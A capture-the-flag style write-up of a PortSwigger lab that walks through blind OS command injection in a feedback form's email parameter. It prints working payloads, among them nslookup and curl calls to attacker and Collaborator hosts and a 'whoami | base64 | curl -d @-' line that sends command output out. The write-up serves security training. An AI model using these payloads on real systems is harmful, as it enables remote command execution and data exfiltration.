# Blind OS command injection with out-of-band data exfiltration

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration), you'll learn: Blind OS command injection with out-of-band data exfiltration! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab contains a blind [OS command injection](https://portswigger.net/web-security/os-command-injection) vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, execute the `whoami` command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-5/images/Pasted%20image%2020230301141502.png)

In here, we can see there's a "Submit feedback" page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-5/images/Pasted%20image%2020230301141514.png)

Let's try to submit one:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-5/images/Pasted%20image%2020230301141531.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-5/images/Pasted%20image%2020230301141539.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-5/images/Pasted%20image%2020230301141551.png)

When we clicked the "Submit feedback" button, it'll send a POST request to `/feedback/submit`, with parameter `csrf`, `name`, `email`, `subject`, `message`, and the response is an empty JSON data.

Now, if the web application want to send an email to somewhere, **it could be using a Linux command called `mail`.**

That being said, we can try to do **OS command injection** in the `email` parameter:

```bash
|| id%0a
```

We **pipe (parse) the previous command into `id`**. Also, **we’ll need to provide a newline character(`\n` or `%0a` in URL encoding)**, to execute the `id` command.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-5/images/Pasted%20image%2020230301141622.png)

However, there's no output of our command in the response.

With that said, it might be vulnerable to blind OS command injection.

We can use an injected command that will trigger an out-of-band network interaction with a system that we control, using OAST techniques. For example:

```bash
& nslookup kgji2ohoyw.web-attacker.com &
```

This payload uses the `nslookup` command to cause a DNS lookup for the specified domain. The attacker can monitor for the specified lookup occurring, and thereby detect that the command was successfully injected.

- Go to Burp Suite's Collaborator, and copy the payload:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-5/images/Pasted%20image%2020230301141701.png)

- Send the payload:

**Payload:**
```bash
|| nslookup wyy9cdjn926m58clco02e0hiy945svgk.oastify.com%0a
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-5/images/Pasted%20image%2020230301141738.png)

- Burp Suite's Collaborator:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-5/images/Pasted%20image%2020230301141757.png)

As you can see, we successfully **received 2 DNS lookups**, which means **the feedback function is indeed vulnerable to blind OS command injection**!!

**Besides from `nslookup`, we can also use `curl`:**
```bash
|| curl wyy9cdjn926m58clco02e0hiy945svgk.oastify.com%0a
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-5/images/Pasted%20image%2020230301141833.png)

Once we've confirmed blind OS command injection, we can exfiltrate the output from injected commands using OAST techniques:

```bash
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

This will cause a DNS lookup to the attacker's domain containing the result of the `whoami` command:

```
wwwuser.kgji2ohoyw.web-attacker.com
```

**Again, besides from `nslookup`, we can also use `curl`:**
```
|| whoami | base64 | curl -d @- wyy9cdjn926m58clco02e0hiy945svgk.oastify.com%0a
```

It'll first execute `whoami` command. Then `base64` encode the `whoami` output. Finally, send the data via `curl` with POST method from **standard input**.

> In `curl` you can read `stdin` (standard input) and send the contents as the body of a `POST` request using the `-d @-` argument.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-5/images/Pasted%20image%2020230301142408.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-5/images/Pasted%20image%2020230301142433.png)

Nice! We received a HTTP POST request, with the exfiltrated output!

**Base64 decoded:**
```
peter-yFl51e
```

Now we can submit that username!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-5/images/Pasted%20image%2020230301142549.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-5/images/Pasted%20image%2020230301142554.png)

# What we've learned:

1. Blind OS command injection with out-of-band data exfiltration